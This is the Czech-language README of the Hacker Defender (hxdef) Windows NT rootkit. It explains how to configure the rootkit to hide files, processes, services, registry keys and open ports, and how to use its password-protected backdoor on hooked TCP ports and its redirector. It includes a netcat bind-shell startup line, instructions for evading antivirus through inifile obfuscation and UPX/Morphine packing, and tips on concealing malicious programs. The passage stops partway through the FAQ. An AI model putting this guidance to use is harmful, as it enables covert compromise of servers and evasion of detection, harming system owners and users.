=======================[ Hacker defender - Czech readme ]=======================

                                  NT Rootkit
                                  ----------

 Autori:         Holy_Father <holy_father@phreaker.net>
                 Ratter/29A <ratter@atlas.cz>
 Verze:          1.0.0 revisited
 Datum:          15.08.2005
 Home:           http://www.hxdef.org, http://hxdef.net.ru, 
                 http://hxdef.czweb.org, http://rootkit.host.sk

 Betatesteri:    ch0pper <THEMASKDEMON@flashmail.com>
                 aT4r <at4r@hotmail.com>
                 phj34r <phj34r@gmail.com>
                 unixdied <0edfd3cfd9f513ec030d3c7cbdf54819@hush.ai>
                 rebrinak
                 GuYoMe
                 ierdna <ierdna@go.ro>
                 Afakasf <undefeatable@pobox.sk>

 Readme:         ceske & anglicke napsal holy_father
                 francouzske napsal GuYoMe



=====[ 1. Obsah ]===============================================================

 1. Obsah
 2. Uvod
        2.1 Idea
        2.2 Licence
 3. Pouziti
 4. Inifile
 5. Backdoor
        5.1 Redirector
 6. Technicke otazky
        6.1 Verze
        6.2 Hookovane API
        6.3 Zname chyby
 7. Faq
 8. Soubory



=====[ 2. Uvod ]================================================================

        Hacker defender (hxdef) je rootkit pro Windows NT 4.0, Windows 2000, 
Windows XP a Windows Server 2003, muze take fungovat i na pozdejsich verzich 
systemu zalozenem na NT technologii. Hlavni telo programu je napsano 
v Delphi. Nove funkce jsou nasapsany v assembleru. Driver je napsan v C. 
Pomocne programy jsou programovany prevazne v Delphi.

program pouziva upraveny LDE32
LDE32, Length-Disassembler Engine, 32-bit, (x) 1999-2000 Z0MBiE
special edition for REVERT tool
version 1.05

program pouziva Superfast/Supertiny Compression/Encryption library
Superfast/Supertiny Compression/Encryption library.
(c) 1998 by Jacky Qwerty/29A.


=====[ 2.1 Idea ]===============================================================

        Zakladni myslenka tohoto programu spociva v prepsani casti pameti
u vsech procesu bezicich v systemu. Prepsanim funkcni zakladnich modulu
se docili zmeny chovani procesu. Prepsani nesmi nijak ovlivnit stabilitu 
systemu ani jednotlivych procesu.
        Program musi byt absolutne neviditelny. Nyni umoznuje uzivateli skryt 
soubory, procesy, systemove sluzby a drivery, klice a hodnoty v registru, 
otevrene porty, umoznuje zmenu volneho mista na disku. Take maskuje zmenu 
prepsane pameti a skryva handly skrytych procesu. Program nainstaluje 
neviditelne backdoory a zaregistruje se jako neviditelna systemova sluzba 
a take nainstaluje neviditelny driver. Technologie backdooru pak umoznila 
i implantaci redirectoru.


=====[ 2.2 Licence ]============================================================

        Od verze 1.0.0 je projekt open source, ale existuji i komercni verze 
s ruznymi vylepsenimi a novymi vlastnostmi.

        A samozrejme, ze autori nejsou zodpovedni za nasledky vasi cinnosti 
nebo pouzivanim Hacker defender.



=====[ 3. Pouziti ]=============================================================

        Pouziti hxdefu je celkem snadne:

        >hxdef100.exe [inifile]
nebo 
        >hxdef100.exe [switch] 


        Pokud neni inifile zadan nebo se spousti se switchem, bere se defautne 
jako inifile EXENAME.ini, kde EXENAME je jmeno hlavniho programu bez pripony
(defaultne tedy hxdef100.ini).

        Tyto switche je mozne pouzit pouzit:

        -:installonly   -       pouze nainstaluje sluzbu, ale nespusti se
        -:refresh       -       slouzi k updatovani nastaveni z inifilu
        -:noservice     -       neinstaluje se jako sluzba a spusti se normalne
        -:uninstall     -       uplne odstrani hxdef z pameti a ukonci vsechna 
                                bezici spojeni backdooru
                                zastaveni systemove sluzby hxdefu dela totez

Priklad: 
        >hxdef100.exe -:refresh

        Hxdef se svym defaultnim inifilem je pripraven k pouziti bez zmen 
inifilu. Je ale doporuceno vytvorit vlastni nastaveni. Pro vice informaci viz 
sekce 4. Inifile.
        Switche -:refresh a -:uninstall lze zavolat pouze z originalniho 
exe souboru. To znamena, ze musite znat presnou cestu a jmeno souboru beziciho 
hxdefu, abyste mohli zmenit jeho nastaveni, nebo ho odinstallovat.



=====[ 4. Inifile ]=============================================================

        Inifile musi obsahovat deset casti: [Hidden Table], [Hidden Processes],
[Root Processes], [Hidden Services], [Hidden RegKeys], [Hidden RegValues], 
[Startup Run], [Free Space], [Hidden Ports] a [Settings]. V seznamech jsou 
mezery na pocatku a na konci jmena polozky ignorovany. V [Hidden Table], 
[Hidden Processes], [Root Processes], [Hidden Services] a [Hidden RegValues] 
je moznost pouziti znaku * jako zastupneho znaku za konec retezce. Hvezdicku 
lze pouzit pouze na konci, vse za prvni hvezdickou se ignoruje.

Priklad:
[Hidden Table]
hxdef* 

skryje vsechny soubory, adresare a procesy zacinajici "hxdef".


        Hidden Table obsahuje vycet souboru a adresaru, ktere se maji skryt. 
Pokud se jedna o soubory a adresare, nebude moznost je videt ve file 
managerech. Ujistete se, ze jmena souboru hlavniho programu, inifilu, 
backdooru a driveru jsou v tomto vyctu uvedeny.

        Hidden Processes obsahuje vycet procesu, ktere maji byt skryty. Tyto 
budou neviditelne v tasklistu apod. Jmeno souboru hlavniho programu a backdooru 
by zde melo byt uvedeno.

        Root Processes obsahuje vycet programu, ktere budou imuni vuci infekci.
Pouze temito programy je mozne videt skryte soubory, slozky a programy. Tyto 
programy jsou tedy urceny pro spravce rootkitu. Je mozne mit root proces, 
ktery neni skryty a naopak.
                           
        Hidden Services je seznam nazvu systemovych sluzeb, ktere maji byt 
skryty v tabulce systemovych sluzeb. Defaultni jmeno systemove sluzby hlavniho 
programu rootkitu je HackerDefender100, jmeno driveru je defaultne nastaveno 
na HackerDefenderDrv100. Obe tato jmena lze zmenit v inifilu.

        Hidden RegKeys je seznam klicu v registru, ktere budou skryty. Rootkit 
ma v registru ctyri klice: HackerDefender100, LEGACY_HACKERDEFENDER100, 
HackerDefenderDrv100, LEGACY_HACKERDEFENDERDRV100 defaultne. Pokud zmenite 
jmeno sluzby nebo driveru, meli byste take zmenit tyto polozky.
        Prvni dva klice registru jsou shode se jmenem sluzby a driveru. Dalsi 
dva jsou LEGACY_JMENO. Pokud tedy zmenite jmeno sluzby na BoomTotoJeMojeSluzba, 
vase jmeno klice v registru bude LEGACY_BOOMTOTOJEMOJESLUZBA.

        Hidden RegValues je seznam hodnot v registru, ktere budou skryty. 

        Startup Run je seznam programu, ktere rootkitu spusti po svem spusteni.
Tyto programy pobezi pod stejnymi pravy jako rootkit. Jmeno programu je 
oddeleno otaznikem od jeho parametru. Nepouzivaji se znaky ". Tyto programy 
jsou ukonceny pri prihlaseni uzivatele. Ke spusteni programu po kazdem 
prihlaseni uzivatele pouzijte klasicke metody. V tomto seznamu muzete pouzit 
tyto zkratky:
        %cmd%           - zkratka pro soubor systemoveho shellu + cesta
                          (napr. C:\winnt\system32\cmd.exe)
        %cmddir%        - zkratka pro adresar systemoveho shellu
                          (napr. C:\winnt\system32\)
        %sysdir%        - zkratka pro systemovy adresar
                          (napr. C:\winnt\system32\)
        %windir%        - zkratka pro adresar Windows
                          (napr. C:\winnt\)
        %tmpdir%        - zkratka pro docasny adresar
                          (napr. C:\winnt\temp\)


Priklad:
1)
[Startup Run]
c:\sys\nc.exe?-L -p 100 -t -e cmd.exe

pri spusteni rootkitu se spusti netcat-shell poslouchajici na portu 100

2)
[Startup Run]
%cmd%?/c echo Rootkit started at %TIME%>> %tmpdir%starttime.txt

pri kazdem spusteni rootkitu zapise cas do souboru 
temporary_directory\starttime.txt (napr. do C:\winnt\temp\starttime.txt)
(%TIME% funguje pouze pro Windows 2000 a vyssi)


        Free Space je seznam disku a poctu bytu, ktere maji byt pridany 
k volnemu mistu na tomto disku. Format jedne polozky seznamu je X:NUM, kde X 
oznacuje jmeno jednotky a NUM je pocet bytu, ktere budou pricteny k volnemu 
mistu na tomto disku.

Priklad:
[Free Space]
C:123456789

prida asi 123 MB k volnemu mistu na disku C, ktere se ukazuje ve vlastnostech 
disku


        Hidden Ports je seznam otevrenych portu, ktere nemaji byt videt 
v programech jako jsou OpPorts, FPort, Active Ports, Tcp View atd. Tento seznam 
ma 3 radky. Format prvni radky je TCPI:port1,port2,port3,..., format druhe 
radky pak TCPO:port1,port2,port3,..., format treti radky pak 
UDP:port1,port2,port3,...

Priklad:
1)
[Hidden Ports]
TCPI:8080,456
TCPO:
UDP:

toto skryje dva (prichozi) porty: 8080/TCP a 456/TCP 

2)
[Hidden Ports]
TCPI:
TCPO:8001
UDP:

toto skryje (odchozi) port 8001/TCP

3)
[Hidden Ports]
TCPI:
TCPO:
UDP:53,54,55,56,800

toto skryje pet portu: 53/UDP, 54/UDP, 55/UDP, 56/UDP a 800/UDP


        Settings obsahuji osm hodnot: Password, BackdoorShell, FileMappingName, 
ServiceName, ServiceDisplayName, ServiceDescription, DriverName 
a DriverFileName.
        Password je heslo slozene z 16 znaku, ktere je pak nutno zadavat pri 
praci s backdoorem a redirectorem. Heslo muze byt i kratsi, zbytek se doplni 
mezerami. 
        BackdoorShell je jmeno kopie shellu, ktera se vytvori pri spusteni 
backdooru v docasnem adresari.
        FileMappingName je jmeno sdilene pameti, kde je uchovano nastaveni 
z inifilu pro hooknute procesy.
        ServiceName je jmeno sluzby rootkitu.
        ServiceDisplayName je zobrazovane jmeno sluzby.
        ServiceDescription je popis sluzby.
        DriverName je jmeno driveru.
        DriverFileName je jmeno souboru pro driver hxdefu.

Priklad:
[Settings]
Password=hxdef-rulez
BackdoorShell=hxdefá$.exe
FileMappingName=_.-=[Hacker Defender]=-._
ServiceName=HackerDefender100
ServiceDisplayName=HXD Service 100
ServiceDescription=powerful NT rootkit
DriverName=HackerDefenderDrv100
DriverFileName=hxdefdrv.sys
        
zde je heslo pro backdoor "hxdef-rulez", backdoor zkopiruje systemovy shell 
(vetsinou cmd.exe) do souboru "hxdefá$.exe" do docasneho adresare. Jmeno 
sdilene pameti je "_.-=[Hacker Defender]=-._". Jmeno sluzby je nastaveno 
na "HackerDefender100", zobrazovane jmeno sluzby pak na "HXD Service 100". 
Popis sluzby je "poweful NT rootkit". Jmeno driveru je "HackerDefenderDrv100". 
Driver bude ulozen v souboru "hxdefdrv.sys".


        Specialni znaky |, <, >, :, \, / a " jsou ignorovany na vsech radkach 
inifilu s vyjimkou polozek [Startup Run], [Free Space] a [Hidden Ports] a take 
nejsou ignorovany za prvnim = v polozkach [Settings]. Pouzitim specialnich 
znaku lze dosahnout zmateni antiviru, ktere detekuji inifile.

Priklad:
[H<<<idden T>>a/"ble]
>h"xdef"*


je totez jako


[Hidden Table]
hxdef*

viz hxdef100.ini a hxdef100.2.ini pro vic prikladu

        Vsechny retezce v inifilu krome tech v Settings a Startup Run nejsou 
case sensitivni.



=====[ 5. Backdoor ]============================================================

        Rootkit hookuje nekolik API funkci ve souvislosti s prijimanim dat
ze site. Pokud jsou prichozi data shodna s 256 bitovym identifikacnim klicem, 
overi se heslo a sluzba, zkopiruje se shell do souboru v tempu, vytvori se 
instance shellu a nasledujici tok dat se presmeruje na tento shell. 
        Protoze se hooknuti tyka vsech procesu, vznikne v systemu na vsech TCP 
portech serveru backdoor. Napriklad pokud ma server otevreny port 80/TCP 
pro HTTP, bude tento port slouzit i jako backdoor. Vyjimku zde tvori porty 
otevrene procesem System, ktery neni hooknuty. Backdoor muze fungovat jen tam, 
kde prijimaci buffer je alespon 256 bitu, coz ale odpovida temer vsem 
standardnim serverum jako jsou Apache, IIS nebo Oracle. Vznika tedy backdoor, 
ktery je neviditelny diky tomu, ze jeho komunikace probiha pres klasicky 
server. Z tohoto vyplyva nemoznost detekovat backdoor klasickym portscanem 
a naopak bezproblemovy beh pres firewall. Vyjimku tvori klasicke proxy, 
ktere jsou orientovany na vyssi protokoly jako napr. FTP nebo HTTP. 
        Pri testech na sluzbach IIS se zjistilo, ze HTTP server neloguje tento 
pristup vubec, FTP a SMTP servery zaregistruji koncove odpojeni od serveru.
        Pro pripojeni k backdooru tedy musite pouzit specialniho klienta. 
K tomu slouzi program bdcli100.exe. 

Pouziti: bdcli100.exe host port password

Priklad:
        >bdcli100.exe www.windowsserver.com 80 hxdef-rulez

spoji se s backdoorem, pokud je nainstalovan na serveru www.windowsserver.com
a pokud defaulni heslo pro backdoor nebylo zmeneno

        Klient pro verzi 1.0.0 neni kompatibilni se servery starsich verzi.


=====[ 5.1 Redirector ]=========================================================

        Na zaklade techinky backdooru byl implementovan redirector. Pocatek 
komunikace se navazuje stejne jako u backdooru. Dalsi pakety jsou uz specialni
a urcene primo pro redirector. Tyto pakety generuje pouze redirectorova baze,
kterou uzivatel spousti na svem pocitaci. Pocatecni paket redirovaneho spojeni
urcuje cil prenosu, na zaklade toho se pak cele spojeni prenasi na cilovy 
server a port.
        Base redirectoru uklada sva data do inifilu, ktery je pojmenovan podle 
jmena exe souboru baze (defaultne tedy rdrbs100.ini). Pokud soubor neexistuje,
je automaticky vytvoren. Inifile baze se doporucuje needitovat rucne. Vse lze 
nastavit z koznole baze.
        Pokud chceme pouzit redirector na serveru s instalovanym rootkitem, 
musime nejprve na localhostu spustit bazi. Pote v konzole baze pridame tzv. 
mapped port k rootkitu na vzdalenem serveru. Nakonec se pripojime na bazi 
na localhostu na zvoleny port a prenasime data. Datova komunikace je sifrovana 
pomoci hesla rootkitu. V soucasne verzi je rychlost omezena kolem 256 kBps. 
Redirector rozhodne neni urcen k vysokorychlostnim prenosum velkych souboru. 
Redirector je omezen systemem, na kterem bezi a jeho okolim. Redirector pracuje 
na protokolu TCP.
        Baze je ovladana v soucasne verzi pres 19 prikazu. Zadavani neni case 
senzitive. Jejich funkce osvetluje prikaz HELP. Po startu baze se vykonaji 
prikazy v startup-listu. Prikazy startup-listu se edituji pomoci konzolovych 
prikazu zacinajicich SU.
        Redirector v teto verzi rozlisuje HTTP a ostatni typy spojeni. Pokud je 
typ spojeni oznacen jako HTTP, v paketech se meni parametr Host v hlavicce 
protokolu HTTP. Pro ostatni typy spojeni se pakety nemeni. Maximalni pocet 
redirektoru na jednu bazi je 1000.
        Program je plne funkcni jen pro Windows NT. Pouze na NT je mozno mit
iconu v trayi a schovavat konzolu prikazem HIDE. Pouze na NT je mozne spoustet 
bazi v tzv. silent modu, pri nemz program nema zadny vystup ani ikonu a bezi 
az do sveho ukonceni podle prikazu v startup-listu.
        
Priklady:
1) vypsani stavu mapped portu:

        >MPINFO
        No mapped ports in the list.

2) pridani prikazu MPINFO do startup-listu a vypsani startup-listu:

        >SUADD MPINFO
        >sulist
        0) MPINFO

3) pouziti prikazu HELP:

        >HELP
        Type HELP COMMAND for command details.
        Valid commands are:
        HELP, EXIT, CLS, SAVE, LIST, OPEN, CLOSE, HIDE, MPINFO, ADD, DEL, 
        DETAIL, SULIST, SUADD, SUDEL, SILENT, EDIT, SUEDIT, TEST
        >HELP ADD
        Create mapped port. You have to specify domain when using HTTP type.
        usage: ADD <LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET 
        SERVER> <TARGET SERVER PORT> <PASSWORD> [TYPE] [DOMAIN]
        >HELP EXIT
        Kill this application. Use DIS flag to discard unsaved data.
        usage: EXIT [DIS]

4) pridani mapped portu, chceme na localhostu poslouchat na portu 100, rootkit
je instalovan na serveru 200.100.2.36 na portu 80, server, na ktery chceme 
presmerovat data je www.google.com na port 80, heslo rootkitu je bIgpWd,
spojeni je typu HTTP, ip adresa ciloveho serveru (www.google.com) - ip musime 
vzdy znat - je 216.239.53.100:

        >ADD 100 200.100.2.36 80 216.239.53.100 80 bIgpWd HTTP www.google.com

prikaz ADD muzeme spustit i bez parametru, pak jsme na kazdy zvlast dotazani

5) nyni znovu muzeme zkontrolovat porty pomoci prikazu MPINFO:
        
        >MPINFO
        There are 1 mapped ports in the list. Currently 0 of them open.

6) vypsani seznamu mapped portu:

        >LIST
        000) :100:200.100.2.36:80:216.239.53.100:80:bIgpWd:HTTP

7) vypsani detailu o mapped portu:
        
        >DETAIL 0
        Listening on port: 100
        Mapping server address: 200.100.2.36
        Mapping server port: 80
        Target server address: 216.239.53.100
        Target server port: 80
        Password: bIgpWd
        Port type: HTTP
        Domain name for HTTP Host: www.google.com
        Current state: CLOSED

8) muzeme otestovat zda na serveru 200.100.2.36 je opravdu rootkit s timto 
heslem (tento test neni nutny provadet pred pouzitim portu):

        >TEST 0
        Testing 0) 200.100.2.36:80:bIgpWd - OK

v pripade, ze test selze, vraci se
        
        Testing 0) 200.100.2.36:80:bIgpWd - FAILED

9) port je zatim zavreny, pro pouziti se musi otevrit prikazem OPEN, zavrit 
se pak muze prikazem CLOSE, pokud chceme aplikovat prikaz na vsecky porty, 
piseme misto indexu portu priznak ALL, stav otevreni/zavreni se zobrazi kratce 
po zadani prikazu:
        
        >OPEN 0
        Port number 0 opened.
        >CLOSE 0
        Port number 0 closed.

nebo 

        >OPEN ALL
        Port number 0 opened.
        
10) prikazem SAVE se ulozi aktualni nastaveni do souboru (uklada se take 
automaticky pri ukonceni aplikace prikazem EXIT bez priznaku DIS):
        
        >SAVE
        Saved successfully.


Po otevreni portu je jiz vse pripraveno pro komunikaci, nyni si muzete ve svem
oblibenem prohlizeci zadat jako url retezec http://localhost:100/ a sledovat,
kterak se nacita stranka www.google.com.
        Prvni pakety spojeni mohou dorazit se spozdenim az 5 sekund, ostatni 
jsou pak jiz jen omezeny rychlosti serveru, rychlosti vaseho spojeni a limitem
technologie redirectoru, ktery je v teto verzi kolem 256 kBps. 



=====[ 6. Technicke otazky ]====================================================

        Tato sekce neobsahuje zadne zajimave informace pro bezne uzivatele. 
Tuto sekci by vsak meli cist vsichni betatesteri a vyvojari.


=====[ 6.1 Verze ]==============================================================

1.0.0 revisited
        +       define kompilatoru pro vypnuti hookovani NtOpenFile
        +       outbound TCP connection hiding
        +       oddeleni skrytych souboru a procesu - Hidden Processes
        +       mazani skrytych souboru z Prefetch po startu
        +       vypnuti McAfee Buffer Overflow protection kvuli nekompatibilite
        x       nalezeno a opraveno nekolik bugu, kultivace zdrojoveho kodu

1.0.0   +       open source

0.8.4   +       francouzske readme
        +       hooknuti NtCreateFile pro skryti praci se soubory
        +       jmeno mailslotu je dynamicke
        +       novy switch -:uninstall pro odstraneni a update hxdefu
        +       -:refresh lze ted zavolat pouze z originalniho exe souboru
        +       nove readme - nekolik oprav, vice informaci, faq
        +       zkratky pro [Startup Run]
        +       pridavani volneho mista hooknutim NtQueryVolumeInformationFile 
        +       skyti otevrenych portu hooknutim NtDeviceIoControlFile
        +       mnohem vic informaci v [Comments] v inifilu
        +       podpora Ctrl+C v backdooru
        +       FileMappingName je nyni volitelne
        +       Root Processes bezi na systemove urovni
        +       skryti handlu hooknutim NtQuerySystemInformation class 16
        +       pouzivani systemoveho driveru
        +       antiantivirus inifile
        +       vice stabilni pri spusteni Windows a pri jeho vypinani
        +       zlepsene skryti pameti
        -       nalezen bug v klientu backdooru pri kopirovani dat z clipboardu
        x       nalezen a opraven bug se jmenem sluzby
        x       nalezen a opraven bug pricitani pidu hookem NtOpenProcess 
        x       nalezen a opraven bug v hookovani NtReadVirtualMemory
        x       nalezeno a opraveno nekolik mensich bugu 
        x       nalezen a opraven bug ve jmenu shellu backdooru

0.7.3   +       direct hooking method
        +       skryvani souboru hooknutim NtQueryDirectoryFile
        +       podpora skryvani souboru ntvdm hooknutim NtVdmControl
        +       hookovani novych procesu pres NtResumeThread
        +       infekce procesu hookovanim LdrInitializeThunk
        +       skryvani klicu v registrech hooknutim NtEnumerateKey
        +       skryvani hodnot v registrech hooknutim NtEnumerateValueKey
        +       infekce dll hooknutim LdrLoadDll
        +       vice nastaveni v inifilu
        +       podpora safemodu
        +       maskovani zmeny pameti procesu hooknutim NtReadVirtualMemory
        x       opraven debugger bug 
        x       opraven w2k MSTS bug 
        x       nalezen a opraven zzZ-service bug

0.5.1   +       nikdy vice hookovani WSOCK32.DLL
        x       opraven bug s MSTS

0.5.0   +       nizkourovnovy redirector na zaklade techniky backdooru
        +       ochrana heslem
        +       jmeno inifilu se ziska z jmena exefilu
        +       zlepsena stabilita backdooru
        -       redirector podporuje prenos maximalne kolem 256 kBps,
                nedokonala implementace redirectoru,
                nedokonaly navrh redirectoru
        -       nalezena moznost odhaleni pres handle symbolic link objektu
        -       nalezen bug v souvislosti s MS Termnial Services
        -       nalezen bug ve skryvani souboru pro 16 bitove aplikace
        x       nalezen a opraven bug v enumeraci systemovych sluzeb
        x       nalezen a opraven bug v hookovani serveru

0.3.7   +       moznost upravovat nastaveni za behu
        +       wildcard v nazvech skrytych souboru, procesu a sluzeb
        +       moznost pridat programy do "po spusteni" rootkitu
        x       opraven bug v skryvani sluzeb ve Windows NT 4.0

0.3.3   +       velmi se zlepsila stabilita
        x       opraveny vsechny bugy v chodu na Windows XP
        x       nalezen a opraven bug v skryvani v registru
        x       nalezen a odstranen bug v cinnosti backdoru s vice klienty

0.3.0   +       zlepsena konektivita, stabilita a funkce backdooru
        +       shell backdooru bezi vzdy na systemove urovni
        +       neviditelny shell backdooru
        +       skryti klicu v registru
        x       nalezena a opravena chyba root procesu
        -       nalezena chyba v XP po resetu

0.2.6   x       opraven bug v backdooru

0.2.5   +       plnohodnotna koznola
        +       identifikacni klic backdooru zkracen na 256 bitu
        +       zlepsena instalace backdooru
        -       bug v backdooru

0.2.1   +       spousti se vzdy jako sluzba

0.2.0   +       instalace systemove sluzby
        +       skryti v tabulce systemovych sluzeb
        +       neviditelny backdoor
        +       uplne odstraneni prace s okny

0.1.1   +       skryti v tasklistu
        +       usage - moznost specifikace jmena inifilu
        x       objevena a pote odstranena chyba v komunikaci
        x       opravena chyba v uziti advapi   
        -       objeven bug v souvislosti s debuggery

0.1.0   +       infekce systemovych sluzeb
        +       kratsi, prehlednejsi, rychlejsi kod, stabilnejsi program
        x       opraven bug v komunikaci

0.0.8   +       skryti souboru
        +       infekce novych procesu
        -       neinfikuje systemove sluzby 
        -       bug v komunikaci


=====[ 6.2 Hookovane API ]======================================================

Seznam API funkcni, ktere program u procesu meni:

Kernel32.ReadFile
Ntdll.NtQuerySystemInformation (class 5 a 16)
Ntdll.NtQueryDirectoryFile
Ntdll.NtVdmControl
Ntdll.NtResumeThread
Ntdll.NtEnumerateKey
Ntdll.NtEnumerateValueKey
Ntdll.NtReadVirtualMemory
Ntdll.NtQueryVolumeInformationFile
Ntdll.NtDeviceIoControlFile
Ntdll.NtLdrLoadDll
Ntdll.NtOpenProcess
Ntdll.NtCreateFile
Ntdll.NtOpenFile
Ntdll.NtLdrInitializeThunk
WS2_32.recv
WS2_32.WSARecv
Advapi32.EnumServiceGroupW
Advapi32.EnumServicesStatusExW
Advapi32.EnumServicesStatusExA
Advapi32.EnumServicesStatusA


=====[ 6.3 Known bugs ]=========================================================

        V soucasne verzi je znama jedna chyba.

1)
        Klient backdooru se muze zaseknou pokud do nej kopirujete data 
z clipboardu pouzivanim praveho tlacitka mysi nebo pouzitim konzoloveho menu. 
Stale vsak muzete kopirovat data z clipboardu pouzitim Ctrl+Ins, Shift+Ins 
pokud to umoznuje program bezici v konzole.


        Pokud si myslite, ze jste objevili novou chybu, prosim zminte se o tom 
na verejnem boardu (nebo na boardu pro betatestery, pokud jste betatester) 
nebo poslete mail na <rootkit@host.sk>. Ale predtim si prectete cele toto 
readme, sekci faq, todo list a zpravy na boardu. Pokud jste ani tak nenasli 
zadnou zminku o tom, co chcete napsat, teprve pak o tom napiste.



=====[ 7. Faq ]=================================================================

        Protoze se na boardu vyskytlo nescetne mnoho jednoduchych otazek, byla 
vytvorena nova sekce faqv tomto readme. Predtim nez se na neco zeptate, precte
si toto readme dvakrat a davejte pozor hlavne v teto sekci. Pak prectete stare 
zpravy na boardu a teprve potom, pokud jste nenalezli odpoved na vasi otazku, 
teprve potom se ptejte na boardu.



        Otazky zni: 

1) Stahnul jsem si hxdef, spustil ho a ted se ho nemuzu zbavit. Jak ho mam 
odinstalovat, kdyz nevidim jeho proces, sluzbu ani soubory?
2) Nekdo hacknul muj server, spustil hxdef a ted se ho nemuzu zbavit. Jak ho 
mam odinstalovat a zbavit se vsech tech backdooru na mem serveru?
3) Je tento program detekovan antiviry? A pokud ano, je zde nejaka moznost, 
jak zabranit detekci?
4) Jak je mozne, ze se nemohu pripojit na backdoor na porty 135/TCP, 137/TCP, 
138/TCP, 139/TCP nebo 445/TCP, kdyz cilovy server ma tyto porty otevrene?
5) Je nejaka moznost mit skryty proces, jehoz soubor je viditelny na disku?
6) Co treba schovani svchost.exe a jinych procesu v tasklistu?
7) Pouzivam DameWare a vidim vsecky skryte sluzby a vsecko co ma byt skryte. 
Je to bug?
8) Ale kazdy muze videt moje skryte soubory pres netbios, co s tim mam delat?
9) Klient backdooru nefunguje. Vse se zda byt v poradku, ale po pripojeni vidim 
jen cernou obrazovku a nemuzu nic psat. Co mam delat?
10) Kdy bude nova verze?
11) Pomoci prikazu net.exe muzu zastavit skryte sluzby, je to bug?
12) Je nejaka moznost odhalit tento rootkit?
13) Jak je tedy slozite odhalit hxdef? A uz nekdo udelal program, ktery to 
dokaze? 
14) Jak tedy hxdef detekovat?
15) Znamena 0 na zacatku oznaceni verze, ze je tato verze nestabilni?
16) Kdy bude k dispozici zdrojovy kod? Cetl jsem, ze s verzi 1.0.0, ale kdy?
17) Chci byt betatester, co mam udelat?
18) Je legalni pouzivat tento program?
19) Je mozne nahrat tuto verzi hxdefu na server se starou verzi? Je to mozne 
bez rebootu?
20) Je mozne nahrat budouci verzi na server s touto verzi hxdefu? Je to mozne 
bez rebootu?
21) Je lepsi pouzit -:uninstall nebo net stop ServiceName?
22) Zboznuji tento program. Muzu vam pomoci nejakym financnim prispevkem?
23) Je nejaka moznost skryt C:\temp, ale neskryt C:\winnt\temp?
24) Vidim, ze heslo je v inifilu v plaintextu! Jak je to mozne?
25) Kdyz mam process v Hidden Proceses a tento posloucha na portu, je tento 
port automaticky skryty nebo ho mam napsat do Hidden Ports?



        Nyni jsou tu odpovedi:



1) 
Q: Stahnul jsem si hxdef, spustil ho a ted se ho nemuzu zbavit. Jak ho mam 
odinstalovat, kdyz nevidim jeho proces, sluzbu ani soubory?

A: Pokud zustal inifile nezmeneny, spustte shell a zastavte sluzbu:

        >net stop HackerDefender100

Hxdef je naprogramovan tak, aby se uplne odinstaloval, pokud se zastavi jeho 
sluzba. Ucini totez jako pouziti -:uninstall, ale nepoterbujete vedet, kde je 
nainstalovan.

Pokud jste zmenili ServiceName v Settings inifilu, napiste toto do shellu:

        >net stop ServiceName

kde ServiceName nahradte hodnotou, kterou jste nastavili v inifilu

Pokud jste zapomeli, co jste napsali jako ServiceName v inifilu, nabootujte 
system z CD a zkuste najit inifile hxdefu a podivat se na hodnotu ServiceName, 
pak zastavte sluzbu, jak bylo popsano vyse.


2) 
Q: Nekdo hacknul muj server, spustil hxdef a ted se ho nemuzu zbavit. Jak ho 
mam odinstalovat a zbavit se vsech tech backdooru na mem serveru?

A: Jedine 100% reseni je reinstalovat Windows. Pokud toto nechcete delat, 
bude muset najit inifile jako v otazce 1) vyse. Potom odinstalovat hxdef 
ze systemu, projit jeho inifile a zkusit najit vsechny soubory, ktere se 
nachazeji v jeho seznamech, proverit je a pripadne smazat.


3) 
Q: Je tento program detekovan antiviry? A pokud ano, je zde nejaka moznost, 
jak zabranit detekci?

A: Ano a nejen exe soubor, ale nektere antiviry detekuji i inifile a take 
soubor driveru muze byt detekovat. Odpovede na druhou otazku je ano, muzete 
zabranit detekci pomerne jednoduse. Na webu hxdefu muzete najit program 
Morphine. Pokud pouzijete Morphine na exe soubor hxdefu, ziskate novy exe 
soubor, ktery nebude detekovat beznymi antiviry. Pro zamezeni detekce inifilu 
pouzijte specialnich znaku. Viz sekce 4. Inifile pro vice informaci. Take se 
kouknete na prilozene inifily. Jsou zde dve verze s timtez nastavenim. Avsak 
prvni verze pouziva specialni znaky a proto neni detekovana antiviry. Asi 
nejlepsi moznosti je pouzit UPX pred pouzitim Morphine. UPX redukuje velikost 
exe souboru hxdefu a Morhpine vytvori ochranu pred antiviry. Podivejte se 
do readme Morphinu pro vice informaci.


4) 
Q: Jak je mozne, ze se nemohu pripojit na backdoor na porty 135/TCP, 137/TCP, 
138/TCP, 139/TCP nebo 445/TCP, kdyz cilovy server ma tyto porty otevrene?

A: Jak bylo popsano v sekci 5. Backdoor tohoto readme, backdoor potrebuje 
server s prichozim bufferem vetsim nebo rovnym 256 bitum. A take systemove 
porty nemusi fungovat. Pokud mate problemy s nalezenim toho spravneho portu, 
muzete proste pouzit netcat a poslouchat na libovolnem portu. Pak byste ale 
meli pridat tento port do Hidden Ports v inifilu.


5) 
Q: Je nejaka moznost mit skryty proces, jehoz soubor je viditelny na disku?

A: Ne. A take nelze mit skryty soubor od procesu, ktery je viditelny.


6) 
Q: Co treba schovani svchost.exe a jinych procesu v tasklistu?

A: To opravdu neni dobry napad. Pokud skryjete bezne procesy systemu, mohou 
vase Windows velmi rychle spadnout. Pri pouziti hxdefu nemusite sve zakerne 
programy pojmenovavat jako svchost.exe, lsass.exe atd. muzou mit svoje 
specialni jmena, ktera napisete do Hidden Processes, abyste je skryli.


7) 
Q: Pouzivam DameWare a vidim vsecky skryte sluzby a vsecko co ma byt skryte. 
Je to bug?

A: Neni to bug. DameWare a jiny software, ktery pouziva vzdalene sluzby 
(nebo netbios) muze videt skryte sluzby, protoze toto jeste neni implementovano 
je velky rozdil mezi bugem a tim, co jeste nebylo implementovano. Kouknete se 
do todo listu nawebu pro seznam veci, ktere jeste nebyli implementovany.


8) 
Q: Ale kazdy muze videt moje skryte soubory pres netbios, co s tim mam delat?

A: Ukryjte svoje soubory hluboko do systemovych adresaru, kde je nikdo nebude 
hledat, nebo do adresaru, ktere nejsou nasdilene.


9) 
Q: Klient backdooru nefunguje. Vse se zda byt v poradku, ale po pripojeni vidim 
jen cernou obrazovku a nemuzu nic psat. Co mam delat?

A: Pravdepodobne pouzivate spatny port pro pripojeni. Hxdef se snazi detekovat 
spatne porty a odpojit klienta pri jejich pouziti, ale nekdy se stane, ze tento 
spatny port nedetekuje. Takze zkuste pouzit jiny port.


10) 
